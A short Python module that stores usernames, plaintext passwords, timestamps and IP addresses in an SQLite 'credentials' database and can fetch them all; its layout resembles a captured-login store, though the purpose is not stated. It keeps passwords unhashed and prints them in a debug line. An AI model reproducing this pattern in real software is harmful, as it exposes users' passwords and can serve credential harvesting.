import sqlite3
from pathlib import Path
from datetime import datetime

DB_PATH = Path("app/db/credentials.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT
        )
    ''')
    conn.commit()
    conn.close()

def save_credentials(username: str, password: str, ip_address: str):
    print(f"[DEBUG] Saving credentials: {username=} {password=} {ip_address=}")  # Add this

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    c.execute(
        "INSERT INTO credentials (username, password, timestamp, ip_address) VALUES (?, ?, ?, ?)",
        (username, password, timestamp, ip_address)
    )

    conn.commit()
    conn.close()



def fetch_all_credentials():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, timestamp, ip_address FROM credentials ORDER BY timestamp DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows

